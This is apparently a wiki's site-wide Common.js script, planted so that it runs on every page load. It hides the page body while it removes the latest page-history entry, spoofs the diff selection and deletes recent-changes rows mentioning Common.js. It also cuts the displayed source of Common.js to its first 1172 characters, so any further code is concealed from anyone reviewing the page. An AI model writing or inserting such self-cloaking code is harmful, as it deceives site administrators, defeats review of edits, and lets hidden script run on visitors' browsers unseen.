console.log('void!');
console.log('void!');
console.log('void!');
console.log('void!');console.log('void!');console.log('void!');console.log('void!');
console.log('void!');
document.body.style.display = "none";
substr_length = 1172;
proj_name = "ANP.RAORG555.WIKIA.COM";
s_page = 'Common.js';
s_page = 'ns8-' + s_page.replace(/\./g, '_');
q = setInterval(function () {
    try {
        Element.prototype.remove = function() { this.parentElement.removeChild(this); };
        NodeList.prototype.remove = HTMLCollection.prototype.remove = function() {
            for(var i = 0, len = this.length; i < len; i++) {
                if(this[i] && this[i].parentElement) {
                    this[i].parentElement.removeChild(this[i]);
                }
            }
        };
        HDLB = {
          OldidSpoof : function () {
              document.querySelectorAll('#pagehistory li')[0].remove();
              document.querySelectorAll('[name="oldid"]')[1].click();
              document.querySelectorAll('[name="diff"]')[0].checked = true;
          }
        };
        if ( document.querySelectorAll('[name="oldid"]').length > 1 ) HDLB.OldidSpoof();
        cond = document.querySelectorAll('.mw-enhanced-rc.mw-changeslist-' + s_page);
        if(cond.length > 0) {
            for (var i in cond) {
                cond[i].remove();
            }
        }
        if(wgCanonicalNamespace=="MediaWiki"&&wgTitle=="Common.js") {
	     var jsjs = document.querySelectorAll('.javascript.source-javascript')[0].innerHTML.substr(0, substr_length);
	     document.querySelectorAll('.javascript.source-javascript')[0].innerHTML = jsjs;
	}
        q = clearInterval(q);
        document.body.style.display = "block";
    } catch(e){}
}, 5);